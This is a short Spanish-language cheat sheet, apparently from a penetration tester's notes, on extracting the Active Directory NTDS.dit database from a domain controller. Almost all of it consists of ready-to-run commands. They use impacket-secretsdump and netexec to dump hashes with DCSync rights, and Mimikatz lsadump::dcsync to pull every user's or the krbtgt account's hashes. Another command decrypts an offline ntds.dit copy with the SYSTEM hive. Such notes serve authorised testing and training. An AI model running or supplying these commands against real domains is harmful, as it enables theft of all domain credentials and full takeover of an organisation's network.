NTDS

NTDS.dit es la base de datos de Active Directory y contiene los hashes de las cuentas del dominio. Su extracción requiere privilegios muy altos, acceso al DC o permisos equivalentes a DCSync.

Base de datos del DC con hashes de todos los usuarios del Dominio en AD

Dumpear NTDS

Aviso: Requiere Permisos Elevados o Permisos DCSync

Kali: Dumpear NTDS desde usuario con permisos DCSync

# Impacket
impacket-secretsdump <domain>/<user>:<password>@<ip_dc>
impacket-secretsdump '<user>:<password>@<ip_dc>' -just-dc-ntlm
# Netexec
netexec smb <ip_dc> -u <user> -p <pass> --ntds

Mimikatz: Dumpear NTDS

mimikatz.exe
privilege::debug
# Dumpear NTDS.dit de todos los usuarios del dominio: htb.local
lsadump::dcsync /domain:<domain>.<domain> /all
# Dumpear NTDS.dit de un usuario. Ej. /user:Administrator /user:htb\krbtgt
lsadump::dcsync /domain:<domain>.<domain> /user:<user>

Dumpear archivo ntds.dit

Kali: Dumpear ntds.dit (necesita SYSTEM.save)

impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL
